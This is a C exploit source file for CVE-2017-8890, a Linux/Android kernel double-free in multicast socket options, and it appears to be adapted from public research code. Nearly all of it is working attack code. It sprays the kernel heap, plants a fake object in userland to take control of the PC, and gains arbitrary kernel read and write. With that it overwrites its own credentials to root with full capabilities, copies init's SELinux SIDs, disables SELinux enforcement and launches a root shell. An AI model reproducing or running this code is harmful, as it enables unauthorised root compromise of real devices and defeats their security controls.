/*
 * CVE-2017-8890
 * This is a dobule free vulnerability found by Pray3r using syzkaller from TYA.
 * I exploited it on android phone, and dosen't publish it entirely.
 * But I'm sure that you will know how does it work and make it to root priv. :p
 * If you have any question or cooperation, wellcome to connect with me.
 * 
 * Demo
 * https://asciinema.org/a/MQbN4U1yB2LedJp2tZzjKGUfO
 *
 * Jeremy Huang (jeremyhcw@gmail.com)
 * https://twitter.com/bittorrent3389
 * 
 *
 * -> entry_SYSCALL_64_fastpath() -> SyS_setsockopt() -> SYSC_setsockopt() -> sock_common_setsockopt() -> tcp_setsockopt() -> ip_setsockopt() -> do_ip_setsockopt() -> do_ip_setsockopt() -> ip_mc_join_group() -> sock_kmalloc() -> [...]
 */
 
 /*
 fork from hardenedlinux 
 2018.08.08 modified by thinkycx
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <err.h>
#include <errno.h>
#include <pthread.h>
#include <errno.h>
#include <semaphore.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/prctl.h>

#include "utils.h"
#include "one_igmp.h"
#define PORT 45555
#define children_num 7
#define defrag_num 60
#define real_spray 1
#define FORKCHILD 1
#define fake_next_rcu (0x0c000000) //struct ip_mc_socklist __rcu *next_rcu;
int cpu_num;
struct sockaddr_in serv_addr = {};
sem_t sem;
struct group_req gr_spray = {};
struct sockaddr_in6 in6_spray = {};
int ipv6_fd[1024] = {};
int ipv6_fd_500[500] = {};
int conntfd[2] = {};
/* cpu imformation */
int cpuid = 0;
cpu_set_t mask;
//
bool server_init=false;
bool server_finish=false;
bool client_finish=false;
//
int line, child[8] = {};
pthread_t detect_t;
int bind_cpu_on(int);
static void init_fake_obj(void);
extern int break_kptr_restrict(void);
int getpid(void) {
    return syscall(178);
}
int getcpu(unsigned *cpu, unsigned *a, void *b)
{
    return syscall(__NR_getcpu, &cpu, NULL, NULL);
}

#define spray_times 500 /* spray for the hole. */

// SYMBOL ADDRESS NEED TO CHANGE
// ffffffc000b070e0 T kernel_setsockopt
#define PC_FUNC 0xffffffc000b070e0 //raw is 0xffffffc000415900

// If you want to leak sp ,it can work!  However, I can control the PC only once, so I give it up.
#if 0
pthread_t detect_sp_t;
void *func_detect_sp() 
{

   void *p = (void *)0xc000300;//(void*)(fake_next_rcu -0x11f +0x300);
    printf("[!] %s, detect thread value SP @: %p\n", __func__, p);

    while ( 1 ) {
    	if ( *(unsigned long *)p != 0xdead ) {
            printf("[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! SP value get : %p\n", *(unsigned long *)p);
    	}
    }

    return NULL;
}
#endif 


static int create_socket_spray(int c)  // create socket, to be used for spray.
{
    unsigned i;
    for ( i = 0; i < c ; i++ ) {
        if ((ipv6_fd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("%s, socket() failed.", __func__);
            return i - 1 ;
        }
    }
    return i;
}

static int prepare_spray_obj(int fd,     // spray function 
    struct group_req* gr_spray_ptr, 
    struct sockaddr_in6* in6_spray_ptr, unsigned c)
{
    gr_spray_ptr->gr_interface = 1;
    
    in6_spray_ptr->sin6_family = AF_INET6;
    int8_t addr[16] = "\xff\x00\x00\x0c\x00\x00\x00\x00\x00\x00";            // \xff because kernel will check if it is a muitiple case addr.
    *(unsigned*)&addr[8] = c;
    memcpy(&in6_spray_ptr->sin6_addr, addr, sizeof addr);
    memcpy(&gr_spray_ptr->gr_group, in6_spray_ptr, sizeof(*in6_spray_ptr));
#if 0
    hexdump(gr_spray, sizeof(*gr_spray));
#endif

    return setsockopt(fd, SOL_IPV6, 0x2a, gr_spray_ptr, sizeof(*gr_spray_ptr));  // it will call kmalloc obj in kernel, search function ipv6_sock_mc_join
                                    /*
                                    .text:FFFFFFC000C08340                 MOV             X0, sk  ; sk
                                    .text:FFFFFFC000C08344                 MOV             W1, #0x40 ; size
                                    .text:FFFFFFC000C08348                 MOV             W2, #0xD0 ; priority
                                    .text:FFFFFFC000C0834C                 BL              sock_kmalloc
                                    */
}

static void init_fake_obj(void)   // create fake obj in useland : ip_mc_socklist   and it's address is 0xc0000ff and the PC will be controlled to 0xFFFFFFC000B07120
{

    if ( mmap((void*)fake_next_rcu, 4096, PROT_READ|PROT_WRITE, 
         MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
         err(-1, "mmap at %p failed.", (void*) fake_next_rcu);

    struct ip_mc_socklist *iml = (void*)(fake_next_rcu+0xff);
    struct socket *fake_sock = (void*)&iml->rcu.next;  //0xc00011f
    // this will be 1st arg for kernel_setsockopt().  it means X0 is 0xc00011f.
    printf("[+] %s(), fake_sock : %p\n", __func__, fake_sock);

/*
.text:FFFFFFC000B07110                 LDR             X5, [err,#0x28]
.text:FFFFFFC000B07114                 LDR             X5, [X5,#0x68]
.text:FFFFFFC000B07118                 BLR             X5
.text:FFFFFFC000B0711C
.text:FFFFFFC000B0711C loc_FFFFFFC000B0711C                    ; CODE XREF: kernel_setsockopt+2C↑j
.text:FFFFFFC000B0711C                 STR             oldfs, [X19,#8]
.text:FFFFFFC000B07120                 LDP             X19, oldfs, [SP,#var_s10]
.text:FFFFFFC000B07124                 LDP             X29, X30, [SP+var_s0],#0x20
.text:FFFFFFC000B07128                 RET
*/

    *(size_t*)((char*)fake_sock + 0x28 ) = (char*)fake_sock + 0x100;
    printf("[+] %s(), (char*)fake_sock + 0x28  : %p\n", __func__, ((char*)fake_sock + 0x28 ) );
    printf("[+] %s(), *(size_t*)(char*)fake_sock + 0x28  : %p\n", __func__, *(size_t*)(((char*)fake_sock + 0x28 ) ));

    // SYMBOL ADDRESS NEED TO CHANGE
    // 0xFFFFFFC000B07120 is kernel_setsockopt ret
    *(size_t*)((char*)fake_sock + 0x168 ) = 0xFFFFFFC000B07120;//0xffffffff40404040;//0xFFFFFFC000B07120;//0XFFFFFFC000B07128;//0xFFFFFFC000B07128;//;//;//0xffffffc000d8948c; // kernel_sock_ioctl_ret;
    printf("[+] %s(), (char*)fake_sock + 0x168  : %p\n", __func__, ((char*)fake_sock + 0x168 ) );    
    printf("[+] %s(), *(size_t*)(char*)fake_sock + 0x168  : %p\n", __func__, *(size_t*)(((char*)fake_sock + 0x168 )  ));

    iml->rcu.next = (void*) NULL; // 0xc00011f
    iml->rcu.func = (void*) NULL; // 0xc000127

	printf("[*] iml : %p, &(iml->rcu.next) : %p\n", (void*)iml, &(iml->rcu.next) );


#if 0
// If you want to leak sp ,it can work!  However, I can control the PC only once, so I give it up.
/*
-----
At last
save sp in x1 and blr to x3 (x0+0x10)
0xffffffc000415900 : mov x1, sp ; mov x2, x21 ; ldr x3, [x0, #0x10] ; blr x3
0xffffffc0006bc1dc : ldr x0, [x0, #0x20] ; ldr x2, [x0, #0x1e0] ; ldr x0, [x0, #0x1a0] ; blr x2
0xffffffc00075a0e4 : str x1     , [x0] ; ldr x1, [x0, #0x10] ; ldr x2, [x1, #0x10] ; movz w1, #0xd0 ; blr x2

0x11f:
    |   |   0xffffffc000415900|
    | 0xffffffc0006bc1dc  | |
    |  0xc000300 |   |
...
0xc000300:
    |   SP |    |
    |   X1 0xc000310|   |
    |   X2 RET  0xFFFFFFC00029CC04     |   |
0xc0004a0:
    |   x0 0xc000300 |

0xc0004e0：
    |  x2 0xffffffc00075a0e4    | 
*/
    printf("[*] set rop...\n");
    void *p = fake_sock;
    *(unsigned long *)(p+0x10) = 0xffffffc0006bc1dc;//;
    *(unsigned long *)(p+0x18) = 0xFFFFFFC00029CC04;
    *(unsigned long *)(p+0x20) = 0xc000300;

    *(unsigned long *)(p+0x300 - 0x11f ) = 0xdead;
    *(unsigned long *)(p+0x310 - 0x11f ) = 0xc000310;
    *(unsigned long *)(p+0x320 - 0x11f ) = 0xFFFFFFC00029CC04;//0xffffffff41414141;//;

    *(unsigned long *)(p+0x4a0 - 0x11f ) = 0xc000300;
    *(unsigned long *)(p+0x4e0 - 0x11f ) = 0xffffffc00075a0e4;

    printf("[*] rop fake sock %p \n", fake_sock);
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x10), (unsigned long *)*(unsigned long *)(p+0x10) );
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x18), (unsigned long *)*(unsigned long *)(p+0x18) );
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x20), (unsigned long *)*(unsigned long *)(p+0x20) );
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x300 - 0x11f), (unsigned long *)*(unsigned long *)(p+0x300 - 0x11f) );
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x310 - 0x11f), (unsigned long *)*(unsigned long *)(p+0x310 - 0x11f) );
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x320 - 0x11f), (unsigned long *)*(unsigned long *)(p+0x320 - 0x11f) );

    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x4a0 - 0x11f ), (unsigned long *)*(unsigned long *)(p+0x4a0 - 0x11f ) );
    printf("[*] rop %p @ %p\n",(unsigned long *)(p+0x4e0 - 0x11f ), (unsigned long *)*(unsigned long *)(p+0x4e0 - 0x11f ) );
    if(pthread_create(&detect_sp_t, NULL, func_detect_sp, NULL))
        err(-1, "[-] %s() line: %d, detect_t. ", __func__,__LINE__);
#endif

}

void *detect_fn(void*arg) // use to change iml+0x28 value
{
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());

    struct rcu_head* head = (void*)(fake_next_rcu + 0x11f);
    printf("[!] %s, original value head: %p\n", __func__, head);

    while ( 1 ) {
    	if ( head->next ) {
    		head->func = (void*)PC_FUNC;//0xffffffc000d89438
    		break;
    	}
    }

    printf("[!] fake_next_rcu was modified to : head->next : %p, head->func : %p\n", 
            head->next, head->func);
    return NULL;
}

static int prepare()  
{
    int x, cnt, times, fd, ret, i = ret = times = fd = x = 0;

    printf("[+] %s(), Create spray socket fd ... %d\n", __func__, spray_times);
    int c;
    for ( c = 0 ; c < spray_times ; c++ ) {
        if ((ipv6_fd_500[c] = 
             socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("%s, socket() failed.", __func__);
        }
    }

    printf("[+] %s(), Create defrag spray socket fd ... %d\n", __func__, defrag_num);
    if ( defrag_num == (x = create_socket_spray(defrag_num) )) {
        printf("[+] create_socket_spray done. create # of socket : %d.\n", x);
    }
    else {
        line = __LINE__;
        goto error;
    }

    if(pthread_create(&detect_t, NULL, detect_fn, NULL))
        err(-1, "[-] %s() line: %d, detect_t. ", __func__,__LINE__);

    cnt = 30;
    printf("[+] starting spray fd : %d\n", ipv6_fd[0]);

    for ( i = 0 ; i < cnt ; i++, times = 0 )
        while((ret=prepare_spray_obj(ipv6_fd[i], &gr_spray, &in6_spray, times++)) == 0); 

    printf("[+] spray ipv6 obj(30 times) done, not yet close...\n");

    printf("%s() done.\n", __func__);
    int new_cpuid = cpuid;
    printf("%s(), cpuid : %d, now_cpuid : %d\n", __func__,cpuid, new_cpuid);

    puts("bind_cpu_on(7)");
    for(i =0 ; i < 10000 ;i++) {
        bind_cpu_on(new_cpuid);
    }
    bind_cpu_on(new_cpuid);
    cpuid = new_cpuid;
    printf("[!] Target is on cpu %d\n", cpuid);
    
    return 0;

error:
    printf("[-] error line: %d\n", line);
    return -1; 
}

void *free_fn(void *arg)
{
    int sockfd, i;

    struct sockaddr_in s = { 
        .sin_family = AF_INET, 
        .sin_port = htons(PORT),
        .sin_addr = inet_addr("127.0.0.1"),
    };
    printf("[+] %s()\n", __func__);
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());

    while(!server_init)
        usleep(1);
    // nanosleep({tv_sec=0, tv_nsec=1000}, NULL) = 0  
#define connect_times 2
    for ( i = 0 ; i < connect_times ; i++ )//while(1)
    {
        sockfd = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP);

        //printf("%s(), sockfd : %d\n", __func__, sockfd);
        if (connect(sockfd, (struct sockaddr*)&s, sizeof s ) == 0 ) {
            printf("[+] %d-th client connected successfully...\n", i);
            if ( close(sockfd) != 0 )
                err(-1, "%s(), close(sockfd)\n", __func__);
            
            client_finish=true;
        }    
    }   
    pthread_exit(0);
}

int ser_sockfd;

void *alloc_fn(void *arg)
{
    struct group_req req;
    int ret, i;         // file descriptor for socket
    struct sockaddr_in gg = { 
        .sin_family = AF_INET, 
        .sin_port = htons(PORT),
        .sin_addr = inet_addr("224.0.0.0"), // multicast address
    };
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());

    ser_sockfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP);

    req.gr_interface = 1;
    memcpy(&req.gr_group, &gg, sizeof gg);

    if (setsockopt(ser_sockfd, SOL_IP, MCAST_JOIN_GROUP, &req, sizeof req) == -1)
        warn("setsockopt(SO_REUSEADDR)");

    bind(ser_sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    listen(ser_sockfd, 2);
    
    pthread_t free1_t;
    // Create a client thread to connect.
    if ( pthread_create(&free1_t, NULL, free_fn, NULL))
        err(1, "free1_t");

    server_init = true;

    int addr_len = sizeof serv_addr;
#define accept_times 2
    for ( i = 0 ; i < accept_times ; i++ )
    {
        conntfd[i] = accept4(ser_sockfd, NULL, NULL, 0);
        
        if ( conntfd[i] >= 0 ) 
                printf("[+] %d-th accept() has have executed...\n", i);
        else 
            err(-1, "accept");
    }   
    while ( client_finish == false );
    server_finish=true;

    int c, times = 0;
    for ( c = 0 ; c < 30 ; c++, times = 0 ) {  
        while(prepare_spray_obj(
                    ipv6_fd[c], 
                    &gr_spray, 
                    &in6_spray, 
                    times++) == 0
        );
    }
    bind_cpu_on(cpuid);
    bind_cpu_on(cpuid);

    // close (conntfd[0]) cause by accept4()
    // Trigger kernel after defrag spray.
    if ( conntfd[0] ) 
        close(conntfd[0]);
    else 
        err(-1, "close(conntfd[0])");

    for ( c = 0 ; c < defrag_num ; c++ ) {
       if ( close(ipv6_fd[c]) != 0) 
               err(-1, "close(ipv6_fd[%d] = %d)", c, ipv6_fd[c]);
    }
    
#if real_spray
    
    for ( c = 0 ; c < spray_times ; c++, times = 0 ) {
        while(prepare_spray_obj(
            ipv6_fd_500[c],
            &gr_spray,
            &in6_spray,
            times++) == 0
        );
    }
    printf("[*] spray for the hole... %d times\n", spray_times);
#endif 
    return NULL;

}

static int trigger()
{
    pthread_t alloc_t, free1_t, free2_t;
    int sockfd;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    int i, times = 1;

    alloc_fn(NULL);

    bind_cpu_on(cpuid);
    printf("[+] Current cpu : %d After triggered and sprayed 500 times.\n", cpuid);
#if FORKCHILD
    printf("[*] kill chilren by fork()?\n");
    for ( i = 0 ; i < children_num ; i++ )
    {
        printf("kill pid : %d\n", child[i]);
        kill(child[i], SIGKILL);
    }
    wait(NULL);
#endif 

    printf("[+] All killed\n");

    return 0;
}
int bind_cpu_on(int cpuid) 
{
    int i,now_cpuid = -1;
    /*
    if ( cpuid > sysconf(_SC_NPROCESSORS_CONF) -1 )
        err(-1,"cpuid is over...");
    */
    cpu_set_t get;
    CPU_ZERO(&mask);
    CPU_SET(cpuid, &mask);
    if (cpuid == 7)
        return sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);

    while( cpuid != now_cpuid ) {
        sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);
        now_cpuid = sched_getcpu();
    }
    return now_cpuid;
}

static void keep_spraying(int c)
{
    int sockfd[500] = {};
    unsigned i = 0, times, ret;
    for ( ; i < c ; i++ ) {
        if ((sockfd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
            printf("%s, socket() failed.", __func__);
        }
    }
    
    for ( i = 0 ; i < c ; i++, times = 0 ) 
        while((ret=prepare_spray_obj(sockfd[i], &gr_spray, &in6_spray, times++)) == 0);

    // at keep_spraying()
    for ( i = 0 ; i < c ; i++ ) 
        close(sockfd[i]);
    printf("%s(%d) done.\n",__func__ , c);
    bind_cpu_on(cpuid);

    printf("[*] %s(), prepare close(conntfd[1]) : %d \n", __func__, conntfd[1]);

    if ( accept_times != 1 )
        ret = close(conntfd[1]);
    else if ( ret != 0 )
        err(-1, "close(conntfd[1])");

    struct rcu_head* head = (void*)(fake_next_rcu+0x11f);
    for(;;) {
    	close(dup(0));
    	if ( head->next ) {
    		head->func = (void*)PC_FUNC; //raw is 0xffffffc000d89438 kernel_sock_ioctl
    		break;
    	}
    }
    printf("head->next : %p\n", head->next);
    return;

}

int main(int argc, char *argv[])
{
    cpu_num = sysconf(_SC_NPROCESSORS_CONF);
    setbuf(stdout, NULL);  
    printf("CVE-2017-8890 exploit. cpu_num : %d\n", cpu_num);
    printf("%s(), getpid : %d, gettid() : %d\n", __func__, getpid(), gettid());
#if FORKCHILD   
    int x;
    for ( x = 0; x < children_num ; x++ ) 
    {
        if ( (child[x] = fork() ) == 0 ) {
            printf("I'm child : %d\n", x);
            while(time((time_t*)NULL));
        }   
    }  
#endif
    init_fake_obj();
    cpuid = sched_getcpu();

    if (prepare() < 0 )
        err(-1,"prepare failed..");

    if (trigger() < 0 )
        err(-1, "trigger failed...");
    keep_spraying(500);
    
    char tester[8] = {};

    printf("try to read...\n");

    for (;;) {
        if (!read_at_address_pipe((void*)0xFFFFFFC000080000LL, &tester, 4)) {
            printf("Turn UAF to arbitrary read/write succeeded.\n");
            break;
        }   
    }
    printf("done!\n");

    // SYMBOL ADDRESS NEED TO CHANGE
    // ffffffc00177c1a0 D init_task
    size_t init_task = 0xffffffc00177c1a0;

    unsigned int pushable_tasks_value;

    struct list_head init_head;
    size_t *init_head_address;
    unsigned i =0;


    // find init_task address
    // from geneblue's blog
    for(i = 0; i<0x400; i+=sizeof(unsigned int)){
        read_at_address_pipe((void *)(init_task+i),&pushable_tasks_value,sizeof(unsigned int));
        // printf(" address@ %p ,pushable_tasks_value = %p\n",(void *)(init_task+i), pushable_tasks_value);

        if(pushable_tasks_value == 0x8c){
            init_head_address = (void *)(init_task+i-2*sizeof(size_t)); //init head 在该值的前两个地址处，所以要减去8
            printf("[*] init_head_address = %p\n", init_head_address);
            //所以还要在读一次
            read_at_address_pipe(init_head_address, &init_head, sizeof(init_head));  //这一次读出的是内核的链表头

            printf("[*] init head.next= %p\n",(size_t *)init_head.next);
            printf("[*] init head.prev= %p\n",(size_t *)init_head.prev);

            break;
        }
    }

    struct task_list_for_comm task_for_comm; 
    struct task_list_for_comm *task;
    task = &task_for_comm;
    
    struct list_head *list_head_p; // must be a pointer 
    int get_exp_comm = 0;
    int get_init_comm = 0;
    unsigned long offset = 0;

    struct cred *init_cred; 
    struct cred *self_cred; 

    list_head_p = &init_head;
    offset = init_head_address;

    printf("[*] search comm exp...\n");
    while(list_head_p->next != init_head_address ){
        // printf("[*] now offset is @ %p\n", (size_t *)offset); 
        // printf("[*] now list_head_p->next @ %p\n",(size_t *)list_head_p->next);  // NOW TURN O SEARCH

        for(i =0; i<0x400; i+=sizeof(unsigned int)){
            read_at_address_pipe((void *)offset+i, task, sizeof(* task));
            if(is_cpu_timer_valid(&task->cpu_timers[0])
                && is_cpu_timer_valid(&task->cpu_timers[1])
                && is_cpu_timer_valid(&task->cpu_timers[2])
                && task->real_cred == task->cred){
                    // printf("\n[!]                   comm = %s\n",task->comm);
                    if(!strcmp(task->comm,"init")){
                        printf("\n[!]               get process init!\n");
                        init_cred = task->cred;
                        get_init_comm = 1;
                    }
                    if(!strcmp(task->comm,"exp")){
                        printf("\n[!]               get process exp!\n");
                        self_cred = task->cred;
                        get_exp_comm = 1;
                        break;
                    }
            }
        }
        if(get_exp_comm & get_init_comm){
            break;
        }
        // printf("[*] continue to next task_list\n");
        // printf("[*] list_head_p->next @ %p\n\n", (void *)list_head_p->next);
        offset = list_head_p->next;
        read_at_address_pipe(list_head_p->next, list_head_p, sizeof(*list_head_p));
    }
  	if(init_cred == NULL)
    {
        printf("init_cred is null\n");
		return -1;
    }else{
        printf("init_cred @ %p\n", (size_t *)init_cred);
    }

  	if(self_cred == NULL)
    {
        printf("self_cred is null\n");
		return -1;
    }
    else{
        printf("self_cred @ %p\n", (size_t *)self_cred);
    }

	unsigned long val = 0;
    printf("[*]  going to  patch cred!\n");
	write_at_address_pipe(&self_cred->uid, &val, sizeof(self_cred->uid));
	write_at_address_pipe(&self_cred->gid, &val, sizeof(self_cred->gid));
	write_at_address_pipe(&self_cred->suid, &val, sizeof(self_cred->suid));
	write_at_address_pipe(&self_cred->sgid, &val, sizeof(self_cred->sgid));
	write_at_address_pipe(&self_cred->euid, &val, sizeof(self_cred->euid));
	write_at_address_pipe(&self_cred->egid, &val, sizeof(self_cred->egid));
	write_at_address_pipe(&self_cred->fsuid, &val, sizeof(self_cred->fsuid));
	write_at_address_pipe(&self_cred->fsgid, &val, sizeof(self_cred->fsgid));  

    val = -1;
	write_at_address_pipe(&self_cred->cap_inheritable.cap[0], &val, sizeof(self_cred->cap_inheritable.cap[0]));
	write_at_address_pipe(&self_cred->cap_inheritable.cap[1], &val, sizeof(self_cred->cap_inheritable.cap[1]));
	write_at_address_pipe(&self_cred->cap_permitted.cap[0], &val, sizeof(self_cred->cap_permitted.cap[0]));
	write_at_address_pipe(&self_cred->cap_permitted.cap[1], &val, sizeof(self_cred->cap_permitted.cap[1]));
	write_at_address_pipe(&self_cred->cap_effective.cap[0], &val, sizeof(self_cred->cap_effective.cap[0]));
	write_at_address_pipe(&self_cred->cap_effective.cap[1], &val, sizeof(self_cred->cap_effective.cap[1]));
	write_at_address_pipe(&self_cred->cap_bset.cap[0], &val, sizeof(self_cred->cap_bset.cap[0]));
	write_at_address_pipe(&self_cred->cap_bset.cap[1], &val, sizeof(self_cred->cap_bset.cap[1]));
	write_at_address_pipe(&self_cred->cap_ambient.cap[0], &val, sizeof(self_cred->cap_ambient.cap[0]));
	write_at_address_pipe(&self_cred->cap_ambient.cap[1], &val, sizeof(self_cred->cap_ambient.cap[1]));


    printf("[*]  patch security\n");

    unsigned long *temp1;
    unsigned long *temp2;

    printf("[!] init_cred->security address @ %p\n", (unsigned long*)&init_cred->security);
    printf("[!] self_cred->security address @ %p\n", (unsigned long*)&self_cred->security);
    temp1 = &init_cred->security;
    temp2 = &self_cred->security;

    printf("&init_cred->security temp1 @ %p\n", (unsigned long*)temp1);
    printf("&self_cred->security temp2 @ %p\n", (unsigned long*)temp2);

    read_at_address_pipe(&init_cred->security, &temp1, sizeof(unsigned long *)); // 
    read_at_address_pipe(&self_cred->security, &temp2, sizeof(unsigned long *));

    printf("init_cred->security temp1 @ %p\n", (unsigned long*)temp1);
    printf("self_cred->security temp2 @ %p\n", (unsigned long*)temp2);

	struct task_security_struct *init_tss;
    init_tss = malloc(sizeof(struct task_security_struct));

	struct task_security_struct *self_tss;
    self_tss = malloc(sizeof(struct task_security_struct));;

    memset(init_tss,0,sizeof(struct task_security_struct));
    memset(self_tss,0,sizeof(struct task_security_struct));

    printf("init_tss  %p \n", init_tss);
    printf("self_tss %p \n", self_tss);
    printf("*init_tss %p \n", *(unsigned long *)init_tss);
    printf("*self_tss %p \n", *(unsigned long *)self_tss);
    printf("[!]hex dump init_tss\n");
    hexdump((void *)init_tss,sizeof(init_tss));
    printf("[!]hex dump self_tss\n");
    hexdump((void *)self_tss,sizeof(self_tss));


    printf("[1] before write!\n");
    read_at_address_pipe((void *)temp1, init_tss, sizeof(* init_tss));
    read_at_address_pipe((void *)temp2, self_tss, sizeof(* self_tss));

    // printf("init_tss osid %p sid %p exec_sid %p create_sid %p keycreate_sid %p  sockcreate_sid %p \n", &init_tss->osid, &init_tss->sid, &init_tss->exec_sid, &init_tss->create_sid , &init_tss->keycreate_sid, &init_tss->sockcreate_sid);
    printf("init_tss osid %#x sid %#x exec_sid %#x create_sid %#x keycreate_sid %#x  sockcreate_sid %#x \n", init_tss->osid, init_tss->sid, init_tss->exec_sid, init_tss->create_sid , init_tss->keycreate_sid, init_tss->sockcreate_sid);
    // printf("self_tss osid %p sid %p exec_sid %p create_sid %p keycreate_sid %p  sockcreate_sid %p  \n", &self_tss->osid, &self_tss->sid, &self_tss->exec_sid, &self_tss->create_sid, &self_tss->keycreate_sid, &self_tss->sockcreate_sid);
    printf("self_tss osid %#x sid %#x exec_sid %#x create_sid %#x keycreate_sid %#x  sockcreate_sid %#x \n", self_tss->osid, self_tss->sid, self_tss->exec_sid, self_tss->create_sid, self_tss->keycreate_sid, self_tss->sockcreate_sid);

    printf("[2] start to write.\n");
	struct task_security_struct *kernel_init_tss;
    struct task_security_struct *kernel_self_tss;
    kernel_init_tss = (struct task_security_struct*)temp1;
    kernel_self_tss = (struct task_security_struct*)temp2;
    printf("kernel_init_tss  %p \n", kernel_init_tss);
    printf("kernel_self_tss %p \n", kernel_self_tss);

	write_at_address_pipe((unsigned long*)&kernel_self_tss->osid, (unsigned long*)&init_tss->osid, sizeof(unsigned int));
	write_at_address_pipe((unsigned long*)&kernel_self_tss->sid, (unsigned long*)&init_tss->sid, sizeof(unsigned int));
	// write_at_address_pipe((unsigned long*)&kernel_self_tss->exec_sid, (unsigned long*)&init_tss->exec_sid, sizeof(unsigned int));
	// write_at_address_pipe((unsigned long*)&kernel_self_tss->create_sid, (unsigned long*)&init_tss->create_sid, sizeof(unsigned int));
	// write_at_address_pipe((unsigned long*)&kernel_self_tss->keycreate_sid, (unsigned long*)&init_tss->keycreate_sid, sizeof(unsigned int));
	// write_at_address_pipe((unsigned long*)&kernel_self_tss->sockcreate_sid, (unsigned long*)&init_tss->sockcreate_sid, sizeof(unsigned int));
    
    printf("write done!\n");

    printf("[3] after write!\n");
    read_at_address_pipe((void *)temp1, init_tss, sizeof(* init_tss));
    read_at_address_pipe((void *)temp2, self_tss, sizeof(* self_tss));

    // printf("init_tss osid %p sid %p exec_sid %p create_sid %p keycreate_sid %p  sockcreate_sid %p \n", &init_tss->osid, &init_tss->sid, &init_tss->exec_sid, &init_tss->create_sid , &init_tss->keycreate_sid, &init_tss->sockcreate_sid);
    printf("init_tss osid %#x sid %#x exec_sid %#x create_sid %#x keycreate_sid %#x  sockcreate_sid %#x \n", init_tss->osid, init_tss->sid, init_tss->exec_sid, init_tss->create_sid , init_tss->keycreate_sid, init_tss->sockcreate_sid);
    // printf("self_tss osid %p sid %p exec_sid %p create_sid %p keycreate_sid %p  sockcreate_sid %p  \n", &self_tss->osid, &self_tss->sid, &self_tss->exec_sid, &self_tss->create_sid, &self_tss->keycreate_sid, &self_tss->sockcreate_sid);
    printf("self_tss osid %#x sid %#x exec_sid %#x create_sid %#x keycreate_sid %#x  sockcreate_sid %#x \n", self_tss->osid, self_tss->sid, self_tss->exec_sid, self_tss->create_sid, self_tss->keycreate_sid, self_tss->sockcreate_sid);



    printf("[!] patch selinux_enabled and selinux_enforcing...\n");
    //SYMBOL ADDRESS NEED TO CHANGE
    //ffffffc0016267f4 D selinux_enabled
    //ffffffc0019e0c3c B selinux_enforcing
    unsigned int * selinux_enabled = (unsigned int*)0xffffffc0016267f4;
    unsigned int * selinux_enforcing = (unsigned int*)0xffffffc0019e0c3c;
    val = 0;
    
    write_at_address_pipe((void*)selinux_enabled, &val, sizeof(unsigned int));
    write_at_address_pipe((void*)selinux_enforcing, &val, sizeof(unsigned int));

    printf("[*]  get root!!!\n");

    system("/system/bin/sh");
    // printf("[*]  what!!!\n");
 #if 0

    printf("[!] we're trying to find ksyms firstly.\n");
    if ( 1 != break_kptr_restrict() )
        err(-1, "ksym not found.");

    init_task = (size_t)get_kallsym_address("init_task", NULL);

    printf("init_task : %p\n", (void*)init_task);
    found_tsk_by_swapper(init_task);  /* in post_exp.c */

    system("/system/bin/sh");
    while(1);
#endif
    return 0;

}